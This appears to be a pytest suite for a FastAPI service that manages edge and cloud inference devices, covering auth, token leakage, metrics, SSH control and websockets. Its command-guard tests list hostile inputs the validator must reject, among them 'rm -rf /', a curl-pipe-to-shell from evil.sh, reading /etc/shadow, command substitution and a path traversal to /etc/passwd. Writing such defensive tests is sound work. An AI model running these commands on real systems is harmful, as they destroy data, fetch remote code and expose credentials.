"""End-to-end coverage of the deliverables checklist (guide §10)."""

from __future__ import annotations

import pytest

from app.inference import simulation as sim
from app.ssh import commands as cmds
from app.ssh.commands import CommandRejected


# ------------------------------------------------------------------- boot/auth
def test_health_needs_no_token(client):
    r = client.get("/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_protected_routes_reject_missing_and_bad_tokens(client):
    assert client.get("/devices").status_code == 401
    assert client.get("/devices", headers={"Authorization": "Bearer nope"}).status_code == 401


def test_openapi_declares_the_security_schemes(client):
    """Without these, Swagger UI renders no Authorize button and no padlocks --
    the token would work over curl but be untestable from /docs."""
    schema = client.get("/openapi.json").json()
    schemes = schema["components"]["securitySchemes"]
    assert set(schemes) == {"BearerToken", "ApiTokenHeader"}
    assert schemes["BearerToken"] == {
        "type": "http",
        "scheme": "bearer",
        "description": schemes["BearerToken"]["description"],
    }
    assert schemes["ApiTokenHeader"]["in"] == "header"
    assert schemes["ApiTokenHeader"]["name"] == "X-API-Token"

    # Protected routes carry a security requirement; /health stays public.
    assert schema["paths"]["/devices"]["get"]["security"]
    assert not schema["paths"]["/health"]["get"].get("security")
    # The token must not also appear as an ordinary parameter.
    params = schema["paths"]["/devices"]["get"].get("parameters", [])
    assert not [p for p in params if p["name"].lower() in ("authorization", "x-api-token")]


def test_x_api_token_header_is_accepted(client, auth):
    from tests.conftest import TOKEN

    assert client.get("/devices", headers={"X-API-Token": TOKEN}).status_code == 200
    assert client.get("/devices", headers={"X-API-Token": "wrong"}).status_code == 401


def test_bare_token_without_bearer_prefix_still_works(client):
    """Lenient fallback kept for callers that omit the scheme prefix."""
    from tests.conftest import TOKEN

    assert client.get("/devices", headers={"Authorization": TOKEN}).status_code == 200


def test_docs_is_public_and_never_leaks_the_token_to_non_loopback(client):
    """The /docs autofill must be gated on a local connection: with
    `--host 0.0.0.0` a remote visitor must not be handed the API token."""
    from tests.conftest import TOKEN

    r = client.get("/docs")  # TestClient presents as host "testclient"
    assert r.status_code == 200  # viewing docs needs no token
    assert TOKEN not in r.text
    assert "swagger-ui" in r.text  # stock page, Authorize button intact


def test_docs_autofills_the_token_for_a_local_request(client, monkeypatch):
    from tests.conftest import TOKEN

    monkeypatch.setattr("app.main._is_loopback", lambda request: True)
    body = client.get("/docs").text
    assert TOKEN in body
    assert "preauthorizeApiKey" in body
    # Both schemes are pre-authorized so either satisfies require_token.
    assert "ApiTokenHeader" in body and "BearerToken" in body


def test_docs_autofill_can_be_disabled(client, monkeypatch):
    from tests.conftest import TOKEN

    monkeypatch.setattr("app.main._is_loopback", lambda request: True)
    monkeypatch.setattr("app.main.settings.docs_autofill_token", False)
    assert TOKEN not in client.get("/docs").text


def test_forwarded_headers_cannot_fake_a_local_request(client):
    """`_is_loopback` reads the socket, not X-Forwarded-For, so a remote caller
    cannot claim to be local to harvest the token."""
    from tests.conftest import TOKEN

    r = client.get(
        "/docs",
        headers={"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "Host": "localhost"},
    )
    assert TOKEN not in r.text


def test_cors_header_present(client, auth):
    r = client.get("/health", headers={**auth, "Origin": "http://localhost:5173"})
    assert r.headers.get("access-control-allow-origin") == "*"


# ---------------------------------------------------------------------- seed
def test_seed_imports_ui_export(client, auth, ui_export):
    r = client.post("/seed", json=ui_export, headers=auth)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["devices"] == 5
    assert body["config"]["num_clusters"] == 2
    assert body["config"]["auto_balance"] == "power"

    devices = client.get("/devices", headers=auth).json()
    assert len(devices) == 5
    by_name = {d["name"]: d for d in devices}
    # UI aliases survive the round trip.
    assert by_name["Jetson-A"]["bw"] == 12
    assert by_name["Jetson-A"]["lat"] == 6
    assert by_name["Jetson-A"]["cluster"] == 1
    assert by_name["Jetson-A"]["side"] == "edge"
    assert by_name["Jetson-A"]["role"] == "head"
    assert by_name["GPU-1"]["side"] == "cloud"
    assert by_name["GPU-1"]["role"] == "tail"


def test_seed_never_leaks_credentials(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    client.patch("/devices/dA", json={"password": "hunter2", "auth_method": "password"}, headers=auth)

    device = client.get("/devices", headers=auth).json()
    dA = next(d for d in device if d["id"] == "dA")
    assert dA["has_password"] is True
    assert "password" not in dA

    # The shareable export omits connection details entirely.
    exported = client.get("/export", headers=auth).json()
    blob = repr(exported)
    assert "hunter2" not in blob
    assert "password" not in blob


# ------------------------------------------------------------------- metrics
def test_metrics_latest_matches_the_simulator(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    body = client.get("/metrics/latest", headers=auth).json()
    assert [c["cluster"] for c in body["clusters"]] == [1, 2]

    # Values verified against the UI's JS math (see the JScript parity harness):
    # cluster 1 -> cut 2, cluster 2 -> cut 1 under power balancing at 8 bits.
    # Timings are rounded to 3dp on the wire, hence the 1e-3 tolerance.
    c1, c2 = body["clusters"]
    assert (c1["cut"], c2["cut"]) == (2, 1)
    assert c1["edge_ms"] == pytest.approx(0.921610, abs=1e-3)
    assert c1["transfer_ms"] == pytest.approx(29.742933, abs=1e-3)
    assert c1["cloud_ms"] == pytest.approx(0.625510, abs=1e-3)
    assert c1["e2e_ms"] == pytest.approx(31.290054, abs=1e-3)
    assert c1["msg_mb"] == pytest.approx(0.2609152, abs=1e-4)
    assert c1["fps"] == pytest.approx(33.621432, abs=1e-3)
    assert c1["transfer_util"] == 1.0  # the link is the bottleneck here
    assert c1["source"] == "sim"

    assert body["aggregate_fps"] == pytest.approx(33.621432 + 16.081555, abs=1e-2)

    # Every §6 key the UI renders must be present.
    for key in (
        "cluster", "cut", "edge_ms", "transfer_ms", "cloud_ms", "e2e_ms",
        "msg_mb", "fps", "edge_util", "transfer_util", "cloud_util",
        "queue_depth", "devices",
    ):
        assert key in c1, key

    ids = {d["id"] for d in c1["devices"]}
    assert ids == {"dA", "dB", "dG1"}


def test_latency_mode_changes_the_cut(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    client.patch("/config", json={"autoBalance": "latency"}, headers=auth)
    clusters = client.get("/metrics/latest", headers=auth).json()["clusters"]
    assert [c["cut"] for c in clusters] == [8, 8]


def test_manual_split_and_per_cluster_override(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)

    client.patch("/config", json={"manualEnabled": True, "manualSplit": 5}, headers=auth)
    assert [c["cut"] for c in client.get("/metrics/latest", headers=auth).json()["clusters"]] == [5, 5]

    # A per-cluster override outranks the global manual split.
    r = client.patch("/clusters/1", json={"cut_layer": 9}, headers=auth)
    assert r.status_code == 200
    clusters = client.get("/metrics/latest", headers=auth).json()["clusters"]
    assert [c["cut"] for c in clusters] == [9, 5]

    # Out-of-range overrides are refused rather than silently clamped.
    assert client.patch("/clusters/1", json={"cut_layer": 99}, headers=auth).status_code == 400


def test_idle_cluster_is_reported_not_crashed(client, auth, ui_export):
    export = {**ui_export, "stages": [ui_export["stages"][0]]}  # edges only
    client.post("/seed", json=export, headers=auth)
    clusters = client.get("/metrics/latest", headers=auth).json()["clusters"]
    assert all(c.get("idle") for c in clusters)
    assert clusters[0]["reason"]


# ------------------------------------------------------------------ clusters
def test_cluster_queue_names_follow_the_ui_convention(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    clusters = client.get("/clusters", headers=auth).json()
    assert [c["queue_name"] for c in clusters] == [
        "intermediate_queue_1",
        "intermediate_queue_2",
    ]
    assert clusters[0]["edge_devices"] == ["dA", "dB"]
    assert clusters[0]["cloud_devices"] == ["dG1"]
    assert clusters[0]["live"] is False


def test_num_bit_changes_message_size(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    before = client.get("/metrics/latest", headers=auth).json()["clusters"][0]["msg_mb"]
    client.patch("/clusters/1", json={"num_bit": 4}, headers=auth)
    after = client.get("/metrics/latest", headers=auth).json()["clusters"][0]["msg_mb"]
    # msg_mb is rounded to 4dp on the wire, so compare within that resolution.
    assert after == pytest.approx(before / 2, abs=1e-4)


# -------------------------------------------------------------------- devices
def test_device_crud(client, auth):
    created = client.post(
        "/devices",
        json={"id": "dx", "name": "Edge-X", "kind": "Edge", "cluster": 1,
              "gflops": 500, "bw": 20, "lat": 5, "host": "10.0.1.99"},
        headers=auth,
    )
    assert created.status_code == 201, created.text
    assert created.json()["bw"] == 20

    patched = client.patch("/devices/dx", json={"gflops": 640, "bw": 25}, headers=auth)
    assert patched.status_code == 200
    assert (patched.json()["gflops"], patched.json()["bandwidth_mb_s"]) == (640, 25)

    assert client.delete("/devices/dx", headers=auth).status_code == 204
    assert client.patch("/devices/dx", json={"gflops": 1}, headers=auth).status_code == 404


def test_duplicate_device_id_conflicts(client, auth):
    payload = {"id": "dup", "name": "A", "kind": "Edge"}
    assert client.post("/devices", json=payload, headers=auth).status_code == 201
    assert client.post("/devices", json=payload, headers=auth).status_code == 409


def test_device_with_unknown_key_ref_is_refused(client, auth):
    r = client.post(
        "/devices",
        json={"name": "K", "kind": "Edge", "auth_method": "key", "key_ref": "ghost"},
        headers=auth,
    )
    assert r.status_code == 400
    assert "key_ref" in r.text


# -------------------------------------------------------------- command guard
@pytest.mark.parametrize(
    "command",
    ["nvidia-smi", "uptime", "nproc", "df -h", "free -h",
     "systemctl restart inference-agent", "python3 -m agent.edge_agent --help"],
)
def test_allow_listed_commands_pass(command):
    # `systemctl restart` is on the allow-list but is also destructive, so it
    # additionally needs confirm=true -- see tests/test_commands_update.py.
    assert cmds.validate_command(command, confirm=cmds.is_destructive(command)) == command


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "nvidia-smi; rm -rf /",
        "uptime && curl evil.sh | sh",
        "cat /etc/shadow",
        "nproc `whoami`",
        "df -h > /etc/passwd",
        "echo $(id)",
        "",
    ],
)
def test_dangerous_commands_are_rejected(command):
    with pytest.raises(CommandRejected):
        cmds.validate_command(command)


def test_unsafe_flag_opens_the_gate():
    assert cmds.validate_command("uptime | tail -1", allow_unsafe=True)


def test_exec_endpoint_rejects_bad_command(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/exec", json={"device_ids": ["dA"], "command": "rm -rf /"}, headers=auth
    )
    assert r.status_code == 400
    assert "allow-list" in r.text


def test_exec_endpoint_rejects_unknown_device(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/exec", json={"device_ids": ["ghost"], "command": "uptime"}, headers=auth
    )
    assert r.status_code == 404


def test_scp_requires_absolute_remote_path(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/scp",
        data={"device_ids": "dA", "remote_path": "relative/path"},
        files={"file": ("head.pt", b"weights", "application/octet-stream")},
        headers=auth,
    )
    assert r.status_code == 400
    assert "absolute" in r.text


def test_scp_rejects_parent_traversal(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/scp",
        data={"device_ids": "dA", "remote_path": "/opt/../etc/passwd"},
        files={"file": ("x.bin", b"x", "application/octet-stream")},
        headers=auth,
    )
    assert r.status_code == 400


# ------------------------------------------------------------------ ssh state
def test_connect_persists_the_ui_connection_form(client, auth, ui_export):
    """The UI's `state.ssh.conn[id]` maps onto the device record."""
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post(
        "/control/connect",
        json={
            "device_ids": ["dA"],
            "credentials": [
                {"device_id": "dA", "ip": "10.0.1.10", "port": 2222,
                 "user": "ubuntu", "password": "s3cret"}
            ],
        },
        headers=auth,
    )
    # No real host to reach, so the attempt fails -- but the form must be saved.
    assert r.status_code == 200
    assert r.json()["failed"] == 1

    dA = next(d for d in client.get("/devices", headers=auth).json() if d["id"] == "dA")
    assert (dA["host"], dA["port"], dA["username"]) == ("10.0.1.10", 2222, "ubuntu")
    assert dA["auth_method"] == "password"
    assert dA["has_password"] is True
    assert dA["ssh_status"] == "error"


def test_status_and_disconnect(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    assert client.get("/control/status", headers=auth).status_code == 200
    r = client.post("/control/disconnect", json={}, headers=auth)
    assert r.status_code == 200


# ---------------------------------------------------------------------- runs
def test_start_without_shards_or_devices_is_a_400(client, auth):
    r = client.post("/run/start", json={}, headers=auth)
    assert r.status_code == 400
    assert "edge" in r.text and "cloud" in r.text


def test_deploy_without_shards_reports_the_missing_files(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    r = client.post("/run/deploy", json={"cluster": 1}, headers=auth)
    assert r.status_code == 400
    assert "head.pt" in r.text


def test_active_and_history_are_empty_initially(client, auth):
    assert client.get("/run/active", headers=auth).json()["runs"] == []
    assert client.get("/run/history", headers=auth).json()["runs"] == []


# ------------------------------------------------------------------ websocket
def test_ws_requires_a_token(client):
    from starlette.websockets import WebSocketDisconnect

    with pytest.raises(WebSocketDisconnect):
        with client.websocket_connect("/ws/stream") as ws:
            ws.receive_json()


def test_ws_streams_snapshot_then_events(client, auth, ui_export):
    from app.services.metrics_bus import bus

    client.post("/seed", json=ui_export, headers=auth)
    with client.websocket_connect("/ws/stream?token=test-token") as ws:
        snapshot = ws.receive_json()
        assert snapshot["type"] == "snapshot"
        assert "ssh_status" in snapshot and "metrics" in snapshot

        bus.ssh_status("dA", "on")
        frame = ws.receive_json()
        assert frame["type"] == "ssh_status"
        assert frame["device_id"] == "dA"
        assert frame["status"] == "on"
        assert frame["ts"]  # every envelope is stamped

    with client.websocket_connect("/ws/stream?token=test-token") as ws:
        ws.receive_json()  # snapshot
        bus.exec_line("dB", "31% util", "stdout")
        frame = ws.receive_json()
        assert frame["type"] == "exec_line"
        assert frame["device_id"] == "dB"
        assert frame["text"] == "31% util"
        assert frame["stream"] == "stdout"

        bus.metrics({"cluster": 1, "cut": 6, "fps": 21.3})
        frame = ws.receive_json()
        assert frame["type"] == "metrics"
        assert frame["payload"]["cluster"] == 1


# ------------------------------------------------------------------- models
def test_model_registry_lists_builtins(client, auth):
    body = client.get("/models", headers=auth).json()
    names = {m["value"] for m in body["models"]}
    assert {"yolov11n", "yolov11s", "yolo26n"} <= names
    n = next(m for m in body["models"] if m["value"] == "yolov11n")
    assert n["layer_count"] == 12
    assert n["total_gflops"] == pytest.approx(7.0, abs=1e-6)
    assert body["max_message_mb"] == 15


def test_custom_model_upload_and_use(client, auth, ui_export):
    client.post("/seed", json=ui_export, headers=auth)
    layers = [{"name": f"L{i}", "flops": 1.0, "bytes": 400_000} for i in range(6)]
    r = client.post("/models", json={"name": "tiny", "label": "Tiny", "layers": layers}, headers=auth)
    assert r.status_code == 201

    client.patch("/clusters/1", json={"model_name": "tiny"}, headers=auth)
    c1 = client.get("/metrics/latest", headers=auth).json()["clusters"][0]
    assert c1["layer_count"] == 6
    # power balancing puts ~944/(944+9800) = 8.8% of 6 GFLOPs on the edge -> cut 1
    assert c1["cut"] == 1

    assert client.post("/models", json={"name": "yolov11n", "layers": layers}, headers=auth).status_code == 409
    assert client.post("/models", json={"name": "empty", "layers": []}, headers=auth).status_code == 400
    assert client.delete("/models/tiny", headers=auth).status_code == 204


def test_builtin_layer_tables_are_unchanged():
    """Guards against accidental edits to the ported model zoo."""
    n = sim.BUILTIN_MODELS["yolov11n"].layers
    assert len(n) == 12
    assert (n[0].flops, n[0].bytes) == (0.35, 3_211_264)
    assert (n[-1].flops, n[-1].bytes) == (0.58, 100_352)
    # scale(2.6) caps activation growth at 1.6x; flops scale linearly.
    s = sim.BUILTIN_MODELS["yolov11s"].layers
    assert (s[0].flops, s[0].bytes) == (0.91, 5_138_022)
    assert sim.BUILTIN_MODELS["yolo26n"].layers[0].flops == 0.402


# ------------------------------------------------------------------- config
def test_config_round_trip(client, auth):
    r = client.patch(
        "/config",
        json={"clustering": True, "numClusters": 3, "autoBalance": "latency",
              "manualEnabled": False, "manualSplit": 4, "modelName": "yolov11s"},
        headers=auth,
    )
    assert r.status_code == 200
    body = r.json()
    assert body["num_clusters"] == 3
    assert body["auto_balance"] == "latency"
    assert body["model_name"] == "yolov11s"
    assert client.get("/config", headers=auth).json() == body


def test_num_clusters_clamps_device_assignment(client, auth, ui_export):
    """A device pinned past num_clusters folds into the last cluster (UI rule)."""
    client.post("/seed", json=ui_export, headers=auth)
    client.patch("/config", json={"numClusters": 1}, headers=auth)
    clusters = client.get("/metrics/latest", headers=auth).json()["clusters"]
    assert len(clusters) == 1
    assert {d["id"] for d in clusters[0]["devices"]} == {"dA", "dB", "dC", "dG1", "dG2"}
